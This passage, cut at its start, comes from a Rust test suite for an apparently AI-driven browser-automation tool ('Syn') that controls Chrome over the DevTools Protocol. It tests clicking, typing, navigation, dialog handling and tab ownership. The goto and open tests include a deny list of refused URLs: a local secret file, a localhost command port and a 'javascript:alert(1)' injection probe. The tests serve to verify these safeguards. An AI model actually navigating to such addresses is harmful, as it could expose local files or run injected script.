                if seen == 1 {
                    vec![reply(id, "{\"result\":{\"type\":\"object\"},\"exceptionDetails\":{\"text\":\"Uncaught\",\"exception\":{\"description\":\"Error: Execution context was destroyed\"}}}")]
                } else {
                    vec![evaluated(id, "{\"ok\":true,\"text\":\"after the move\",\"total\":14,\"off\":0,\"n\":1}")]
                }
            }
            _ => vec![reply(id, "{}")],
        });
        let (mut c, _) = cdp_with(ans, vec![the_tab()]);
        let r = c.dispatch_call(&read("h1"), H).unwrap();
        assert!(r.ok && r.preview == "after the move", "{r:?}");
    }

    // ---- finding the tab -----------------------------------------------

    #[test]
    fn an_unknown_tab_is_refused_and_the_tabs_there_are_are_named() {
        // The browser is asked which tabs it has -- the list held may be
        // stale -- and that is all that goes on the wire.
        let (mut c, st) = cdp_with(answering(vec![("T1", "Visual Studio Code", "vscode://x")], vec![]), vec![]);
        let r = c.dispatch_call(&read("h1"), "web:photoshop::doc").unwrap();
        assert!(!r.ok);
        assert!(r.error.contains("no open tab matches \"photoshop\""), "{}", r.error);
        assert!(r.error.contains("tab-t1 \"Visual Studio Code\""), "say what IS open, by the name to use: {}", r.error);
        assert_eq!(methods(&st), ["Target.getTargets"]);
    }

    #[test]
    fn a_tab_opened_after_connecting_is_found() {
        // Live: the list was taken at connect, when the page had no title
        // yet, and every call after that failed with `open targets: [""]`.
        let (mut c, st) = cdp_with(
            answering(vec![("NEW1234567", "Quarterly numbers", "http://x/")], vec![("S.read(", "{\"ok\":true,\"text\":\"Q3\",\"total\":2,\"off\":0,\"n\":1}")]),
            vec![],
        );
        let r = c.dispatch_call(&read("h1"), "web:Quarterly numbers::doc").unwrap();
        assert!(r.ok, "{}", r.error);
        assert_eq!(r.preview, "Q3");
        assert_eq!(methods(&st)[..2], ["Target.getTargets", "Target.attachToTarget"]);
    }

    #[test]
    fn a_dead_socket_is_a_transport_error() {
        // The browser is gone: it says nothing and the socket is closed.
        let (mut c, st) = cdp_with(Box::new(|_, _, _, _| vec![]), vec![the_tab()]);
        st.borrow_mut().closed = true;
        let e = c.dispatch_call(&read("h1"), H).unwrap_err();
        assert_eq!(e.kind(), std::io::ErrorKind::UnexpectedEof);
    }

    #[test]
    fn a_cdp_protocol_error_surfaces_as_an_error() {
        let ans: Answer = Box::new(|id, _, _, _| vec![format!("{{\"id\":{id},\"error\":{{\"code\":-32602,\"message\":\"No target with given id\"}}}}")]);
        let (mut c, _) = cdp_with(ans, vec![]);
        let e = c.attach("P1").unwrap_err();
        assert!(e.to_string().contains("No target with given id"), "{e}");
    }

    #[test]
    fn an_unsupported_call_never_reaches_the_browser() {
        let (mut c, st) = one_tab(vec![]);
        let r = c.dispatch_call(&Call::Undo, H).unwrap();
        assert!(!r.ok && r.error.contains("no undo"), "{}", r.error);
        let r = c.dispatch_call(&office("sort", &[]), H).unwrap();
        assert!(!r.ok);
        assert!(st.borrow().log.is_empty());
    }

    // ---- pressing, as a person does -------------------------------------

    fn click(sel: &str) -> Call {
        Call::Struct(StructArgs::Invoke { selector: sel.into(), action: "click".into() })
    }

    const PREP_OK: &str = "{\"ok\":true,\"x\":120.5,\"y\":88,\"d\":\"button#go \\\"Go\\\"\",\"n\":1,\"sel\":\"#go\",\"tag\":\"button\",\"type\":\"submit\",\"checked\":false}";
    const PAGE_A: &str = "{\"title\":\"Form\",\"url\":\"http://x/form\",\"ready\":\"complete\",\"status\":200,\"y\":0,\"h\":0,\"vh\":700}";

    #[test]
    fn a_click_is_a_real_press_at_the_middle_of_the_thing() {
        let (mut c, st) = one_tab(vec![("S.page(", PAGE_A), ("S.prep(", PREP_OK)]);
        let r = c.dispatch_call(&click("#go"), H).unwrap();
        assert!(r.ok, "{}", r.error);
        assert!(r.preview.starts_with("clicked button#go \"Go\"."), "{}", r.preview);
        let log = st.borrow().log.clone();
        let mouse: Vec<&String> = log.iter().filter(|(m, _, _)| m == "Input.dispatchMouseEvent").map(|(_, p, _)| p).collect();
        assert_eq!(mouse.len(), 3, "arrive, press, release: {mouse:?}");
        assert!(mouse[0].contains("\"type\":\"mouseMoved\"") && mouse[0].contains("\"x\":120.5") && mouse[0].contains("\"y\":88"));
        assert!(mouse[1].contains("\"type\":\"mousePressed\"") && mouse[1].contains("\"button\":\"left\"") && mouse[1].contains("\"clickCount\":1"));
        assert!(mouse[2].contains("\"type\":\"mouseReleased\""));
    }

    #[test]
    fn a_press_on_something_covered_sends_no_mouse_event_and_says_what_covers_it() {
        let covered = "{\"ok\":false,\"why\":\"covered\",\"say\":\"button#covered is covered by div#veil at the point where it would be pressed\"}";
        let (mut c, st) = one_tab(vec![("S.page(", PAGE_A), ("S.prep(", covered)]);
        let r = c.dispatch_call(&click("#covered"), H).unwrap();
        assert!(!r.ok && r.error.contains("is covered by div#veil"), "{}", r.error);
        assert!(!methods(&st).iter().any(|m| m.starts_with("Input.")), "nothing was pressed: {:?}", methods(&st));
    }

    /// A browser whose page is at one address until a mouse release, and at
    /// another after it, the way a click on a link goes.
    fn navigating_page(status_after: u32) -> Answer {
        let mut released = false;
        Box::new(move |id, method, params, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Input.dispatchMouseEvent" if params.contains("mouseReleased") => {
                released = true;
                vec![
                    reply(id, "{}"),
                    event("Page.frameStartedLoading", "{\"frameId\":\"F1\"}", Some("S1")),
                    event("Page.frameStoppedLoading", "{\"frameId\":\"F1\"}", Some("S1")),
                ]
            }
            "Runtime.evaluate" => {
                if expr_of(params).starts_with("S.page(") {
                    let (t, u, s) = if released { ("Landed", "http://x/landed", status_after) } else { ("Form", "http://x/form", 200) };
                    vec![evaluated(id, &format!("{{\"title\":\"{t}\",\"url\":\"{u}\",\"ready\":\"complete\",\"status\":{s},\"y\":0,\"h\":0,\"vh\":700}}"))]
                } else {
                    vec![evaluated(id, PREP_OK)]
                }
            }
            _ => vec![reply(id, "{}")],
        })
    }

    #[test]
    fn a_press_that_follows_a_link_says_where_the_page_went_and_how_to_see_it() {
        let (mut c, _) = cdp_with(navigating_page(200), vec![the_tab()]);
        let r = c.dispatch_call(&click("#go"), H).unwrap();
        assert!(r.ok, "{}", r.error);
        assert!(r.preview.contains("The page is now \"Landed\" at http://x/landed."), "{}", r.preview);
        assert!(r.preview.contains("read{\"handle\":\"web:tab-5b3f8::doc\",\"selector\":\":map\"}"), "a call to copy: {}", r.preview);
    }

    #[test]
    fn a_page_that_answers_with_an_error_status_is_said_to_be_probably_the_wrong_page() {
        let (mut c, _) = cdp_with(navigating_page(404), vec![the_tab()]);
        let r = c.dispatch_call(&click("#go"), H).unwrap();
        assert!(r.preview.contains("HTTP 404: the server answered with an error"), "{}", r.preview);
    }

    #[test]
    fn a_dialog_the_page_opens_in_the_middle_of_a_press_is_answered_or_the_press_never_returns() {
        // `alert()` blocks the page until it is closed, and the press does not
        // come back until the page does. Live this hung a call for good.
        let held: Rc<RefCell<Option<u64>>> = Rc::default();
        let answers: Rc<RefCell<Vec<String>>> = Rc::default();
        let (h2, a2) = (Rc::clone(&held), Rc::clone(&answers));
        let ans: Answer = Box::new(move |id, method, params, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Input.dispatchMouseEvent" if params.contains("mouseReleased") => {
                *h2.borrow_mut() = Some(id);
                vec![event("Page.javascriptDialogOpening", "{\"url\":\"http://x/\",\"message\":\"hello from alert\",\"type\":\"alert\",\"hasBrowserHandler\":false}", Some("S1"))]
            }
            "Page.handleJavaScriptDialog" => {
                a2.borrow_mut().push(params.to_string());
                let mut out = vec![reply(id, "{}")];
                if let Some(held) = h2.borrow_mut().take() {
                    out.push(reply(held, "{}"));
                }
                out
            }
            "Runtime.evaluate" => {
                if expr_of(params).starts_with("S.page(") { vec![evaluated(id, PAGE_A)] } else { vec![evaluated(id, PREP_OK)] }
            }
            _ => vec![reply(id, "{}")],
        });
        let (mut c, _) = cdp_with(ans, vec![the_tab()]);
        let r = c.dispatch_call(&click("#go"), H).unwrap();
        assert!(r.ok, "{}", r.error);
        assert_eq!(answers.borrow().len(), 1);
        assert!(answers.borrow()[0].contains("\"accept\":true"), "an alert is closed: {:?}", answers.borrow());
        assert!(r.preview.contains("Also: a alert dialog appeared and said \"hello from alert\"; Syn closed it."), "{}", r.preview);
    }

    #[test]
    fn a_question_the_page_asks_is_answered_cancel_because_it_is_the_persons_to_answer() {
        let (mut c, st) = one_tab(vec![]);
        c.on_event(&event("Page.javascriptDialogOpening", "{\"message\":\"Delete everything?\",\"type\":\"confirm\"}", Some("S1")));
        assert_eq!(c.notes.len(), 1);
        assert!(
            c.notes[0].contains("asked \"Delete everything?\"") && c.notes[0].contains("answered Cancel") && c.notes[0].contains("the person's to decide"),
            "{}",
            c.notes[0]
        );
        let sent = st.borrow().log.clone();
        assert_eq!(sent[0].0, "Page.handleJavaScriptDialog");
        assert!(sent[0].1.contains("\"accept\":false"), "{}", sent[0].1);
    }

    #[test]
    fn a_page_that_loads_for_ever_is_given_up_on_and_the_press_returns() {
        let (mut c, st) = one_tab(vec![]);
        c.attach("5B3F8A9C1D2E").unwrap();
        // The page says it started loading and never says it stopped.
        c.on_event(&event("Page.frameStartedLoading", "{\"frameId\":\"F1\"}", Some("S1")));
        let began = Instant::now();
        c.settle("S1", Duration::from_millis(10), Duration::from_millis(300)).unwrap();
        assert!(began.elapsed() < Duration::from_secs(2), "it must give up at the limit it was given");
        assert!(st.borrow().log.len() >= 2);
    }

    #[test]
    fn a_press_that_starts_nothing_costs_only_the_look() {
        let (mut c, _) = one_tab(vec![]);
        c.attach("5B3F8A9C1D2E").unwrap();
        let began = Instant::now();
        c.settle("S1", Duration::from_millis(40), Duration::from_secs(20)).unwrap();
        assert!(began.elapsed() < Duration::from_secs(2), "nothing was loading: no reason to wait for it");
    }

    #[test]
    fn a_tab_a_page_opens_is_reported_with_its_name_and_may_be_closed_by_syn() {
        let (mut c, _) = one_tab(vec![]);
        c.attach("5B3F8A9C1D2E").unwrap();
        c.on_event(&event(
            "Target.targetCreated",
            "{\"targetInfo\":{\"targetId\":\"AAAA1111BBBB\",\"type\":\"page\",\"title\":\"\",\"url\":\"http://x/form\",\"openerId\":\"5B3F8A9C1D2E\"}}",
            None,
        ));
        assert_eq!(c.notes.len(), 1);
        assert!(c.notes[0].contains("a new tab opened (http://x/form): tab-aaaa1") && c.notes[0].contains("path\":\"tab-aaaa1\""), "{}", c.notes[0]);
        assert!(c.opened.contains("AAAA1111BBBB"), "a page Syn drove opened it, so it is Syn's to close");
        // A tab the person opened by themselves is not Syn's.
        c.on_event(&event("Target.targetCreated", "{\"targetInfo\":{\"targetId\":\"CCCC2222DDDD\",\"type\":\"page\",\"url\":\"http://y/\"}}", None));
        assert!(!c.opened.contains("CCCC2222DDDD"));
        assert_eq!(c.notes.len(), 1, "and it is not announced as something Syn did");
    }

    // ---- typing, keys, waiting -----------------------------------------

    fn verb(v: &str, args: &[(&str, &str)]) -> Call {
        office(v, args)
    }

    #[test]
    fn typing_is_key_events_one_character_at_a_time_after_the_field_is_ready() {
        let (mut c, st) = one_tab(vec![
            ("S.field(", "{\"ok\":true,\"d\":\"input#q\",\"n\":1,\"kind\":\"field\",\"sel\":\"#q\"}"),
            ("S.state(", "{\"ok\":true,\"d\":\"input#q\",\"now\":\"Hi!\"}"),
            ("S.page(", PAGE_A),
        ]);
        let r = c.dispatch_call(&verb("type", &[("selector", "#q"), ("text", "Hi!")]), H).unwrap();
        assert!(r.ok, "{}", r.error);
        assert_eq!(r.preview, "typed 3 characters into input#q; it now holds \"Hi!\".");
        let keys: Vec<String> = st.borrow().log.iter().filter(|(m, _, _)| m == "Input.dispatchKeyEvent").map(|(_, p, _)| p.clone()).collect();
        assert_eq!(keys.len(), 6, "a down and an up for each: {keys:?}");
        assert!(keys[0].contains("\"type\":\"keyDown\"") && keys[0].contains("\"text\":\"H\"") && keys[0].contains("\"modifiers\":8"), "{}", keys[0]);
        assert!(keys[1].contains("\"type\":\"keyUp\""));
        assert!(keys[2].contains("\"text\":\"i\"") && keys[2].contains("\"modifiers\":0"), "{}", keys[2]);
        assert!(keys[4].contains("\"text\":\"!\""), "{}", keys[4]);
    }

    #[test]
    fn typing_into_a_password_field_is_refused_before_a_key_is_pressed() {
        let refused = "{\"ok\":false,\"why\":\"secret\",\"say\":\"input#pw is a password field. Syn does not type those: ask the person\"}";
        let (mut c, st) = one_tab(vec![("S.field(", refused)]);
        let r = c.dispatch_call(&verb("type", &[("selector", "#pw"), ("text", "hunter2")]), H).unwrap();
        assert!(!r.ok && r.error.contains("Syn does not type those"), "{}", r.error);
        assert!(!methods(&st).iter().any(|m| m.starts_with("Input.")));
    }

    #[test]
    fn a_new_line_in_typed_text_is_the_enter_key_and_a_foreign_character_is_inserted_whole() {
        let (mut c, st) = one_tab(vec![
            ("S.field(", "{\"ok\":true,\"d\":\"textarea#msg\",\"n\":1,\"kind\":\"field\",\"sel\":\"#msg\"}"),
            ("S.state(", "{\"ok\":true,\"now\":\"x\"}"),
            ("S.page(", PAGE_A),
        ]);
        c.dispatch_call(&verb("type", &[("selector", "#msg"), ("text", "a\n\u{e9}")]), H).unwrap();
        let log = st.borrow().log.clone();
        let keys: Vec<&String> = log.iter().filter(|(m, _, _)| m == "Input.dispatchKeyEvent").map(|(_, p, _)| p).collect();
        assert!(keys.iter().any(|p| p.contains("\"key\":\"Enter\"")), "{keys:?}");
        let inserted: Vec<&String> = log.iter().filter(|(m, _, _)| m == "Input.insertText").map(|(_, p, _)| p).collect();
        assert_eq!(inserted.len(), 1, "an accent has no key of its own");
        assert!(inserted[0].contains('\u{e9}'));
    }

    #[test]
    fn a_key_is_pressed_down_and_up_and_a_shortcut_types_nothing() {
        let (mut c, st) = one_tab(vec![("S.page(", PAGE_A)]);
        let r = c.dispatch_call(&verb("press", &[("text", "Control+a")]), H).unwrap();
        assert!(r.ok && r.preview.starts_with("pressed Control+a."), "{}", r.preview);
        let log = st.borrow().log.clone();
        let keys: Vec<&String> = log.iter().filter(|(m, _, _)| m == "Input.dispatchKeyEvent").map(|(_, p, _)| p).collect();
        assert_eq!(keys.len(), 2);
        assert!(keys[0].contains("\"type\":\"rawKeyDown\"") && keys[0].contains("\"modifiers\":2") && !keys[0].contains("\"text\""), "{}", keys[0]);
        let r = c.dispatch_call(&verb("press", &[("text", "Wiggle")]), H).unwrap();
        assert!(!r.ok && r.error.contains("not a key I know"), "{}", r.error);
    }

    #[test]
    fn a_key_aimed_at_the_field_just_typed_into_follows_it_when_the_page_redrew_it() {
        let (mut c, st) = one_tab(vec![
            ("S.field(", "{\"ok\":true,\"d\":\"input#q\",\"sel\":\"#q\"}"),
            ("S.state(", "{\"now\":\"ada\"}"),
            ("S.page(", PAGE_A),
            ("S.focus(", "{\"threw\":\"no element matches #q\"}"),
            ("S.focused(", "{\"d\":\"input[title=Search]\",\"field\":true,\"sel\":\"input\"}"),
        ]);
        let t = c.dispatch_call(&verb("type", &[("selector", "#q"), ("text", "ada")]), H).unwrap();
        assert!(t.ok, "{t:?}");
        let r = c.dispatch_call(&verb("press", &[("text", "Enter"), ("selector", "#q")]), H).unwrap();
        assert!(r.ok && r.preview.contains("redrew the field") && r.preview.contains("input[title=Search]"), "{r:?}");
        let log = st.borrow().log.clone();
        let enters = log.iter().filter(|(m, p, _)| m == "Input.dispatchKeyEvent" && p.contains("\"key\":\"Enter\"")).count();
        assert!(enters >= 2, "the key went down and up on the focus: {log:?}");
        // Used once: the next press at that selector is refused again.
        let again = c.dispatch_call(&verb("press", &[("text", "Enter"), ("selector", "#q")]), H).unwrap();
        assert!(!again.ok && again.error.contains("without a selector"), "{again:?}");
    }

    #[test]
    fn a_key_aimed_at_a_field_that_was_not_just_typed_into_is_still_refused_when_it_is_gone() {
        let (mut c, _) = one_tab(vec![
            ("S.focus(", "{\"threw\":\"no element matches #q\"}"),
            ("S.focused(", "{\"d\":\"input#other\",\"field\":true,\"sel\":\"#other\"}"),
        ]);
        let r = c.dispatch_call(&verb("press", &[("text", "Enter"), ("selector", "#q")]), H).unwrap();
        assert!(!r.ok && r.error.contains("no element matches #q"), "a field that happens to have the focus is not guessed at: {r:?}");
    }

    #[test]
    fn a_key_aimed_at_a_field_the_page_redrew_says_to_press_it_without_a_selector() {
        let (mut c, st) = one_tab(vec![("S.focus(", "{\"threw\":\"no element matches #searchInput\"}")]);
        let r = c.dispatch_call(&verb("press", &[("text", "Enter"), ("selector", "#searchInput")]), H).unwrap();
        assert!(!r.ok && r.error.contains("without a selector"), "{}", r.error);
        let log = st.borrow().log.clone();
        assert!(!log.iter().any(|(m, _, _)| m == "Input.dispatchKeyEvent"), "no key goes anywhere on a refusal");
    }

    #[test]
    fn a_wait_that_is_met_answers_at_once_and_one_that_is_not_says_what_it_waited_for() {
        let (mut c, _) = one_tab(vec![("S.check(", "{\"met\":true,\"why\":\"ul#items\"}")]);
        let r = c.dispatch_call(&verb("wait", &[("selector", "#items")]), H).unwrap();
        assert!(r.ok && r.preview == "ul#items is on the page.", "{r:?}");
        let (mut c, _) = one_tab(vec![("S.check(", "{\"met\":false,\"why\":\"\"}")]);
        let began = Instant::now();
        let r = c.dispatch_call(&verb("wait", &[("text", "Done"), ("name", "1")]), H).unwrap();
        assert!(!r.ok && r.error.contains("still waiting for the words \"Done\" to appear after 1 s"), "{}", r.error);
        assert!(began.elapsed() < Duration::from_secs(4));
        let r = c.dispatch_call(&verb("wait", &[]), H).unwrap();
        assert!(!r.ok && r.error.contains("say what to wait for"), "{}", r.error);
    }

    #[test]
    fn find_lists_where_words_are_written_with_a_selector_for_each() {
        let hits = "{\"ok\":true,\"total\":2,\"hidden\":0,\"hits\":[{\"sel\":\"#price\",\"tag\":\"span\",\"snip\":\"Total price: $12.50\"},{\"sel\":\"p:nth-of-type(3)\",\"tag\":\"p\",\"snip\":\"price list\"}]}";
        let (mut c, _) = one_tab(vec![("S.find(", hits)]);
        let r = c.dispatch_call(&verb("find", &[("text", "price")]), H).unwrap();
        assert!(r.ok && r.preview.starts_with("2 place(s) on the page say \"price\":"), "{}", r.preview);
        assert!(r.preview.contains("#price  \"Total price: $12.50\""), "{}", r.preview);
        let (mut c, _) = one_tab(vec![("S.find(", "{\"ok\":true,\"total\":0,\"hidden\":2,\"hits\":[]}")]);
        let r = c.dispatch_call(&verb("find", &[("text", "secret")]), H).unwrap();
        assert!(r.preview.contains("not written anywhere on the page that can be seen") && r.preview.contains("2 hidden element(s)"), "{}", r.preview);
    }

    // ---- going places ---------------------------------------------------

    #[test]
    fn goto_refuses_what_a_page_must_not_be_pointed_at_before_asking_the_browser() {
        let (mut c, st) = one_tab(vec![]);
        for url in ["file:///C:/secret.txt", "http://127.0.0.1:7777/cmd", "javascript:alert(1)"] {
            let r = c.dispatch_call(&verb("goto", &[("text", url)]), H).unwrap();
            assert!(!r.ok && r.error.contains("refused"), "{url}: {}", r.error);
        }
        assert!(!methods(&st).contains(&"Page.navigate".to_string()));
    }

    #[test]
    fn goto_navigates_waits_and_says_where_it_landed() {
        let mut n = 0;
        let ans: Answer = Box::new(move |id, method, params, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Page.navigate" => vec![
                reply(id, "{\"frameId\":\"F1\",\"loaderId\":\"L1\"}"),
                event("Page.frameStartedLoading", "{\"frameId\":\"F1\"}", Some("S1")),
                event("Page.frameStoppedLoading", "{\"frameId\":\"F1\"}", Some("S1")),
            ],
            "Runtime.evaluate" => {
                assert!(expr_of(params).starts_with("S.page("));
                n += 1;
                let (t, u) = if n == 1 { ("Form", "http://x/form") } else { ("Table page 2", "http://x/table?page=2") };
                vec![evaluated(id, &format!("{{\"title\":\"{t}\",\"url\":\"{u}\",\"ready\":\"complete\",\"status\":200,\"y\":0,\"h\":0,\"vh\":700}}"))]
            }
            _ => vec![reply(id, "{}")],
        });
        let (mut c, st) = cdp_with(ans, vec![the_tab()]);
        let r = c.dispatch_call(&verb("goto", &[("text", "http://x/table?page=2")]), H).unwrap();
        assert!(r.ok, "{}", r.error);
        assert!(r.preview.starts_with("went to http://x/table?page=2. The page is now \"Table page 2\" at http://x/table?page=2."), "{}", r.preview);
        let nav = st.borrow().log.iter().find(|(m, _, _)| m == "Page.navigate").map(|(_, p, _)| p.clone()).unwrap();
        assert!(nav.contains("\"url\":\"http://x/table?page=2\""), "{nav}");
    }

    #[test]
    fn a_page_that_cannot_be_reached_says_why_in_words() {
        let ans: Answer = Box::new(|id, method, _, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Page.navigate" => vec![reply(id, "{\"frameId\":\"F1\",\"errorText\":\"net::ERR_NAME_NOT_RESOLVED\"}")],
            "Runtime.evaluate" => vec![evaluated(id, PAGE_A)],
            _ => vec![reply(id, "{}")],
        });
        let (mut c, _) = cdp_with(ans, vec![the_tab()]);
        let r = c.dispatch_call(&verb("goto", &[("text", "https://no-such-host.example")]), H).unwrap();
        assert!(!r.ok);
        assert!(r.error.contains("could not load https://no-such-host.example: that address does not exist"), "{}", r.error);
    }

    #[test]
    fn back_goes_to_the_earlier_entry_and_says_when_there_is_none() {
        let ans: Answer = Box::new(|id, method, _, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Page.getNavigationHistory" => vec![reply(id, "{\"currentIndex\":1,\"entries\":[{\"id\":11,\"url\":\"http://x/a\"},{\"id\":12,\"url\":\"http://x/b\"}]}")],
            "Runtime.evaluate" => vec![evaluated(id, PAGE_A)],
            _ => vec![reply(id, "{}")],
        });
        let (mut c, st) = cdp_with(ans, vec![the_tab()]);
        let r = c.dispatch_call(&verb("back", &[]), H).unwrap();
        assert!(r.ok, "{}", r.error);
        let entry = st.borrow().log.iter().find(|(m, _, _)| m == "Page.navigateToHistoryEntry").map(|(_, p, _)| p.clone()).unwrap();
        assert!(entry.contains("\"entryId\":11"), "{entry}");
        let r = c.dispatch_call(&verb("forward", &[]), H).unwrap();
        assert!(!r.ok && r.error.contains("no later page"), "{}", r.error);
    }

    // ---- opening and closing tabs --------------------------------------

    #[test]
    fn an_address_opens_a_new_tab_waits_for_it_and_answers_with_its_name_and_the_map() {
        let ans: Answer = Box::new({
            let mut inner = answering(vec![], vec![("S.page(", PAGE_A), ("S.map(", "{\"ok\":true,\"text\":\"PAGE \\\"Form\\\"\\nFIELDS\\n  textbox \\\"Your name\\\"  #name\"}")]);
            move |id, m, p, s| {
                let mut out = inner(id, m, p, s);
                if m == "Page.navigate" {
                    out.push(event("Page.frameStartedLoading", "{\"frameId\":\"F1\"}", Some("S1")));
                    out.push(event("Page.frameStoppedLoading", "{\"frameId\":\"F1\"}", Some("S1")));
                }
                out
            }
        });
        let (mut c, st) = cdp_with(ans, vec![]);
        let r = c.send_envelope(&crate::hand::open_envelope("web", "https://example.com/form")).unwrap();
        assert!(r.ok, "{}", r.error);
        let (alias, said) = r.preview.split_once('|').expect("the name, then what is there");
        assert_eq!(alias, "tab-newta");
        assert!(said.starts_with("opened tab-newta as handle web:tab-newta::doc."), "{said}");
        assert!(said.contains("textbox \"Your name\"  #name"), "what is on the page comes with it: {said}");
        let log = st.borrow().log.clone();
        let create = log.iter().find(|(m, _, _)| m == "Target.createTarget").expect("a new tab").1.clone();
        assert!(create.contains("about:blank"), "made blank, then loaded under a session this hand holds: {create}");
        let nav = log.iter().find(|(m, _, _)| m == "Page.navigate").unwrap().1.clone();
        assert!(nav.contains("https://example.com/form"));
        assert!(c.opened.contains("NEWTAB000111"), "a tab Syn made is Syn's to close");
    }

    #[test]
    fn open_finds_a_tab_that_is_open_by_its_title_or_name_without_making_another() {
        let (mut c, st) = one_tab(vec![("S.page(", PAGE_A), ("S.map(", "{\"ok\":true,\"text\":\"PAGE x\"}")]);
        for want in ["Contact", "tab-5b3f8", "x/form"] {
            let r = c.send_envelope(&crate::hand::open_envelope("web", want)).unwrap();
            assert!(r.ok, "{want}: {}", r.error);
            assert!(r.preview.starts_with("tab-5b3f8|using tab-5b3f8 as handle web:tab-5b3f8::doc."), "{}", r.preview);
        }
        assert!(!methods(&st).contains(&"Target.createTarget".to_string()));
    }

    #[test]
    fn an_address_already_open_is_used_again_not_opened_twice() {
        let (mut c, st) = one_tab(vec![("S.page(", PAGE_A), ("S.map(", "{\"ok\":true,\"text\":\"PAGE x\"}")]);
        let r = c.send_envelope(&crate::hand::open_envelope("web", "http://x/form")).unwrap();
        assert!(r.ok && r.preview.contains("using tab-5b3f8"), "{r:?}");
        assert!(!methods(&st).contains(&"Target.createTarget".to_string()));
    }

    #[test]
    fn open_with_words_that_fit_no_tab_lists_the_tabs_and_says_how_to_open_an_address() {
        let (mut c, st) = one_tab(vec![]);
        let r = c.send_envelope(&crate::hand::open_envelope("web", "Invoice March")).unwrap();
        assert!(!r.ok);
        assert!(r.error.contains("no browser tab has \"Invoice March\""), "{}", r.error);
        assert!(r.error.contains("tab-5b3f8 \"Contact form\" at http://x/form"), "{}", r.error);
        assert!(r.error.contains("open{\"app\":\"browser\",\"path\":\"https://example.com\"}"), "a call to copy: {}", r.error);
        assert!(!methods(&st).contains(&"Target.createTarget".to_string()), "words are not an address: no tab is made for them");
    }

    #[test]
    fn open_refuses_an_address_a_page_must_not_be_pointed_at() {
        let (mut c, st) = one_tab(vec![]);
        let r = c.send_envelope(&crate::hand::open_envelope("web", "file:///C:/Users/me/secret.txt")).unwrap();
        assert!(!r.ok && r.error.contains("local files are opened with Excel"), "{}", r.error);
        let r = c.send_envelope(&crate::hand::open_envelope("web", "http://localhost:7777/")).unwrap();
        assert!(!r.ok && r.error.contains("belongs to Syn itself"), "{}", r.error);
        assert!(!methods(&st).contains(&"Target.createTarget".to_string()));
    }

    #[test]
    fn the_browser_hand_answers_open_and_nothing_else_outside_the_six_ops() {
        let (mut c, _) = one_tab(vec![]);
        let e = c.send_envelope("{\"method\":\"launch\",\"args\":{}}").unwrap_err();
        assert!(e.to_string().contains("answers `open`"), "{e}");
    }

    #[test]
    fn close_closes_a_tab_syn_opened_and_refuses_one_that_was_already_there() {
        let (mut c, st) = one_tab(vec![]);
        let r = c.dispatch_call(&verb("close", &[]), H).unwrap();
        assert!(!r.ok && r.error.contains("was already open when Syn came"), "{}", r.error);
        assert!(!methods(&st).contains(&"Target.closeTarget".to_string()));
        c.opened.insert("5B3F8A9C1D2E".into());
        let r = c.dispatch_call(&verb("close", &[]), H).unwrap();
        assert!(r.ok && r.preview == "closed tab-5b3f8", "{r:?}");
        assert!(methods(&st).contains(&"Target.closeTarget".to_string()));
        assert!(c.targets().iter().all(|t| t.id != "5B3F8A9C1D2E"));
    }

    // ---- exports --------------------------------------------------------

    #[test]
    fn a_screenshot_and_a_pdf_are_written_where_the_path_says() {
        let dir = std::env::temp_dir().join(format!("syn-cdp-export-{}", std::process::id()));
        let png = crate::ws::b64(b"\x89PNG\r\n\x1a\nXX");
        let pdf = crate::ws::b64(b"%PDF-1.4 XX");
        let ans: Answer = Box::new(move |id, method, _, _| match method {
            "Target.attachToTarget" => vec![reply(id, "{\"sessionId\":\"S1\"}")],
            "Page.captureScreenshot" => vec![reply(id, &format!("{{\"data\":\"{png}\"}}"))],
            "Page.printToPDF" => vec![reply(id, &format!("{{\"data\":\"{pdf}\"}}"))],
            _ => vec![reply(id, "{}")],
        });
        let (mut c, _) = cdp_with(ans, vec![the_tab()]);
        let out = dir.join("shots").join("page.png");
        let call = Call::Export(ExportArgs { format: "png".into(), path: Some(out.to_string_lossy().into()), sheet: None });
        let r = c.dispatch_call(&call, H).unwrap();
        assert!(r.ok && r.preview.contains("captured"), "{r:?}");
        assert_eq!(&std::fs::read(&out).unwrap()[..4], b"\x89PNG");
        let out = dir.join("page.pdf");
        let call = Call::Export(ExportArgs { format: "pdf".into(), path: Some(out.to_string_lossy().into()), sheet: None });
        assert!(c.dispatch_call(&call, H).unwrap().ok);
        assert_eq!(&std::fs::read(&out).unwrap()[..4], b"%PDF");
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ---- the browser Syn started goes with Syn ---------------------------

    #[test]
    fn a_browser_syn_started_is_asked_to_close_when_the_hand_goes() {
        let (mut c, st) = one_tab(vec![]);
        // Any long-lived process stands in for the browser.
        let child = if cfg!(windows) {
            std::process::Command::new("cmd").args(["/C", "ping", "-n", "30", "127.0.0.1"]).stdout(std::process::Stdio::null()).spawn().unwrap()
        } else {
            std::process::Command::new("sleep").arg("30").spawn().unwrap()
        };
        c.own(child);
        c.grace = Duration::from_millis(200);
        drop(c);
        assert!(methods(&st).contains(&"Browser.close".to_string()), "asked politely first: {:?}", methods(&st));
    }

    #[test]
    fn a_browser_syn_did_not_start_is_left_alone_when_the_hand_goes() {
        let (c, st) = one_tab(vec![]);
        drop(c);
        assert!(!methods(&st).contains(&"Browser.close".to_string()), "the person's browser is theirs");
    }
}
